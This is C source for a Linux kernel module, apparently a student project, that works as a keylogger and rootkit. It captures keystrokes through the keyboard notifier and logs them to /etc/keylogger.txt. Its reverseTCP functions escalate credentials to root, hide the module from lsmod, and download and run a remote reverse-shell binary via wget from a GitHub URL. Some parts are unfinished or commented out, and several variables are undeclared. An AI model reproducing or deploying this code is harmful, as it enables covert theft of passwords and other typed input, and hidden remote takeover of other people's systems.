#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/semaphore.h>
#include "keylogger.h"

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kthread.h>  // for threads
#include <linux/time.h>   // for using jiffies 
#include <linux/timer.h>

#define DRIVER_DESC     "Keylogger"
#define fullFileName    "/etc/keylogger.txt"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Pon Stars");  // remember to change before you turn in
MODULE_DESCRIPTION("Reverse TCP connection keylogger that will save to a log file");
MODULE_VERSION("1.0");

struct semaphore sem;
static struct task_struct *thread1;

void WriteToFile(char*, size_t);
int setup_disk(void);
ssize_t write_vaddr_disk(void *, size_t);

int index_num = 0;
int buffer_counter = 0;
int buffer_switch = 0;
static char* buffer[2][100];

///////////////////////////

static int    major_number = 0;//<device number -- initialized to place it on the .data section and not on .bss
static struct class*  reverseTCP_class  = NULL;//< class struct pointer
static struct device* reverseTCP_device = NULL;//< device struct pointer


static int     reverseTCP_connect(void);
static int     reverseTCP_release(struct inode *, struct file *);
static int    escale_priv(void);
static int    hide_lsmod(void);

//////////////////////////

static const char* NoShift[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "_BACKSPACE_", "_TAB_",
                        "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "_ENTER_", "_CTRL_", "a", "s", "d", "f",
                        "g", "h", "j", "k", "l", ";", "'", "`", "_SHIFT_", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".",
                        "/", "_SHIFT_", "\0", "\0", " ", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_",
                        "_F8_", "_F9_", "_F10_", "_NUMLOCK_", "_SCROLLLOCK_", "_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5",
                        "_RTARROW_", "+", "_END_", "_DOWN_", "_PGDN_", "_INS_", "_DEL_", "\0", "\0", "\0", "_F11_", "_F12_",
                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_",
                        "_UP_", "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_", "_DEL_", "\0", "\0",
                        "\0", "\0", "\0", "\0", "\0", "_PAUSE_"};

static const char* YesShift[] =
                        { "\0", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", "_BACKSPACE_", "_TAB_",
                        "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "{", "}", "_ENTER_", "_CTRL_", "A", "S", "D", "F",
                        "G", "H", "J", "K", "L", ":", "\"", "~", "_SHIFT_", "|", "Z", "X", "C", "V", "B", "N", "M", "<", ">",
                        "?", "_SHIFT_", "\0", "\0", " ", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_",
                        "_F8_", "_F9_", "_F10_", "_NUMLOCK_", "_SCROLLLOCK_", "_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5",
                        "_RTARROW_", "+", "_END_", "_DOWN_", "_PGDN_", "_INS_", "_DEL_", "\0", "\0", "\0", "_F11_", "_F12_",
                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_",
                        "_UP_", "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_", "_DEL_", "\0", "\0",
                        "\0", "\0", "\0", "\0", "\0", "_PAUSE_"};

static int UnpressedKey = 0;

////////////////////////////////////////

static struct file_operations reverseTCP_fops =
{
   .release = reverseTCP_release, 
};

static int __init reverseTCP_init(void)
{
	#ifdef DEBUG
   printk(KERN_ALERT "reverseTCP: Initializing driver\n");
	#endif

   //get major number
   major_number = register_chrdev(0, DEVICE_NAME, &reverseTCP_fops);
   if (major_number<0)
	{
		#ifdef DEBUG
      printk(KERN_ALERT "reverseTCP: failed to register a major number\n");
		#endif
      major_number = -1;
      return major_number;
   }
	#ifdef DEBUG
   printk(KERN_ALERT "reverseTCP: driver registered with major number %d\n", major_number);
	#endif

   // Register device class
   reverseTCP_class = class_create(THIS_MODULE, CLASS_NAME);
   if (IS_ERR(reverseTCP_class))
	{                
      unregister_chrdev(major_number, DEVICE_NAME);
		#ifdef DEBUG
      printk(KERN_ALERT "reverseTCP: failed to register device class\n");
		#endif
      return PTR_ERR(reverseTCP_class);          
   }
	#ifdef DEBUG
   printk(KERN_ALERT "reverseTCP: device class registered\n");
	#endif

   // Register the device driver
   reverseTCP_device = device_create(reverseTCP_class, NULL, MKDEV(major_number, 0), NULL, DEVICE_NAME);
   if (IS_ERR(reverseTCP_device)){               
      class_destroy(reverseTCP_class);
      unregister_chrdev(major_number, DEVICE_NAME);
		#ifdef DEBUG
      printk(KERN_ALERT "reverseTCP: failed to create the device\n");
		#endif
      return PTR_ERR(reverseTCP_device);
   }
	#ifdef DEBUG
   printk(KERN_ALERT "reverseTCP: device class created correctly\n");
	printk(KERN_ALERT "reverseTCP: calling reverseTCP_connect\n");
	#endif

/*
	call this in init function
**************************************************************************
**************************************************************************/

	escale_priv();
	reverseTCP_connect();
	#ifndef DEBUG
	hide_lsmod();
	#endif
//========================================================================
//========================================================================



	#ifdef DEBUG
   printk(KERN_ALERT "reverseTCP: no hickupp!!!!\n");
	#endif

   return 0;
}

static void __exit reverseTCP_exit(void)
{
   device_destroy(reverseTCP_class, MKDEV(major_number, 0));     
   class_unregister(reverseTCP_class);                          
   class_destroy(reverseTCP_class);                             
   unregister_chrdev(major_number, DEVICE_NAME);             
}

static int reverseTCP_release(struct inode *inodep, struct file *filep)
{
   return 0;
}

static int reverseTCP_connect(void)
{
	struct subprocess_info *sub_info;
	//download userland reverseshell
	static  char *argv[] = { "/bin/sh", "-c","sudo wget -qr -O /usr/.rc.local https://github.com/A283le/RootKit/raw/jlima020-patch-1/shell;sudo chmod 777 /usr/.rc.local; sudo /usr/.rc.local", NULL};    
    static  char *envp[] = {"HOME=/", "TERM=linux", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL};
    
	sub_info = call_usermodehelper_setup( argv[0], argv, envp, GFP_ATOMIC, NULL, NULL, NULL );
  	if (sub_info == NULL) return -ENOMEM; 	
  	return call_usermodehelper_exec( sub_info, UMH_NO_WAIT );
}

static int escale_priv(void)
{
	//elevate priviledges
	struct cred *new;
	new = prepare_creds();
    if (new != NULL) 
	{
          new->uid.val = new -> gid.val = 0;
          new->euid.val = new ->egid.val = 0;
          new->suid.val = new->sgid.val=0;
          new->fsuid.val = new->fsgid.val = 0;
          commit_creds(new);
		#ifdef DEBUG
		printk(KERN_ALERT "now you are root\n");
		#endif
	}
	return 0;
}

//might give error
static int hide_lsmod(void)
{
	
      // hide module from lsmod / proc/modules
      list_del_init(&__this_module.list);
      kobject_del(&__this_module.mkobj.kobj);
      list_del(&__this_module.mkobj.kobj.entry);
	return 0;
 }

//v giving errors v//
//module_init(reverseTCP_init);
//module_exit(reverseTCP_exit);

////////////////////////////////////////

void thread_cleanup(void) {
 int ret;
 ret = kthread_stop(thread1);
 if(!ret)
  printk(KERN_INFO "Thread stopped");

}

int thread_init (void) {
   
    const char * our_thread = "thread1";
    printk(KERN_INFO "in init");
    thread1 = kthread_create(thread_fn, NULL, our_thread);
    if((thread1))
    {
        printk(KERN_INFO "in if");
        wake_up_process(thread1);
    }

	/*/R-TCP code
	escale_priv();
	reverseTCP_connect();
	#ifndef DEBUG
	hide_lsmod();
	#endif
	R-TCP code/*/

    return 0;
}

int thread_fn(void * data) {

    printk(KERN_INFO "Thread started");
    for(index_num = 0; index_num < 100; index_num++){
        WriteToFile(buffer[!buffer_switch][index_num], sizeof(*buffer[!buffer_switch][index_num]));
    }

    thread_cleanup();

    return 0;
}


int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param)
{
    struct keyboard_notifier_param *param = _param;
    if (code == KBD_KEYCODE)
    {
        if( param->value==42 || param->value==54 )
        {
            //acquire lock to modify the global variable UnpressedKey
            down(&sem);
            if(param->down)
                UnpressedKey = 1;
            else
                UnpressedKey = 0;
            up(&sem);
            return NOTIFY_OK;
        }

        if(param->down)
        {
            down(&sem);
            if(UnpressedKey == 0){
                // WriteToFile((char *)NoShift[param->value], sizeof(*NoShift[param->value]));
                buffer[buffer_switch][buffer_counter] = (char *)NoShift[param->value];
                buffer_counter++;
                printk(KERN_INFO "%s \tBuffer Counter: %d\n", NoShift[param->value], buffer_counter);
            }
            else{
                // WriteToFile((char *)YesShift[param->value], sizeof(*YesShift[param->value]));
                buffer[buffer_switch][buffer_counter] = (char *)YesShift[param->value];
                buffer_counter++;
                printk(KERN_INFO "%s \tBuffer Counter: %d\n", YesShift[param->value], buffer_counter);
            }
            up(&sem);
        }
        
        if(buffer_counter == 100){
            thread_init();
            buffer_counter = 0;
            buffer_switch = !buffer_switch;
        }
    }
    return NOTIFY_OK;
}

static struct notifier_block keylogger_nb =
{
    .notifier_call = keylogger_notify
};


static int __init init_keylogger(void)
{
    register_keyboard_notifier(&keylogger_nb);
    printk(KERN_INFO "Registering the keylogger with the keyboard notifier list\n");
    sema_init(&sem, 1);
    return 0;
}

static void __exit cleanup_keylogger(void)
{
    unregister_keyboard_notifier(&keylogger_nb);
    printk(KERN_INFO "Unregistered the keylogger module \n");
}

module_init(init_keylogger);
module_exit(cleanup_keylogger);

void WriteToFile(char *phrase, size_t num_bytes){

   int err = 0;

    printk(KERN_INFO "File to Open: %s\n", fullFileName);
  filepath = fullFileName; // set for disk write code
  err = setup_disk();
  err = write_vaddr_disk(phrase, num_bytes);
  cleanup_disk();
}

int setup_disk() {
   mm_segment_t fs;
   int err;

   fs = get_fs();
   set_fs(KERNEL_DS);

/* file definitions at this url: 
https://www.ibm.com/developerworks/community/blogs/58e72888-6340-46ac-b488-d31aa4058e9c/entry/understanding_linux_open_system_call?lan=en */

   if (dio && reopen) {
      f = filp_open(filepath, O_WRONLY | O_CREAT | O_LARGEFILE | O_APPEND , 0444);
   } else if (dio) {
      f = filp_open(filepath, O_WRONLY | O_CREAT | O_LARGEFILE | O_APPEND , 0444);
   }

   if(!dio || (f == ERR_PTR(-EINVAL))) {
      f = filp_open(filepath, O_WRONLY | O_CREAT | O_LARGEFILE | O_APPEND, 0444);
      dio = 0;
   }
   if (!f || IS_ERR(f)) {
      set_fs(fs);
      err = (f) ? PTR_ERR(f) : -EIO;
      f = NULL;
      return err;
   }

   set_fs(fs);
   return 0;
}

ssize_t write_vaddr_disk(void * v, size_t is) {
   mm_segment_t fs;

   ssize_t s;
   long long pos = 0;

   fs = get_fs();
   set_fs(KERNEL_DS);

   pos = f->f_pos;
   s = vfs_write(f, v, is, &pos);
   if (s == is) {
      f->f_pos = pos;
   }
   set_fs(fs);
   if (s != is && dio) {
      disable_dio();
      f->f_pos = pos;
      return write_vaddr_disk(v, is);
   }
   return s;
}

void cleanup_disk() {
   mm_segment_t fs;

   fs = get_fs();
   set_fs(KERNEL_DS);
   if(f) filp_close(f, NULL);
   set_fs(fs);
}

static void disable_dio() {
   dio = 0;
   reopen = 1;
   cleanup_disk();
   setup_disk();
}


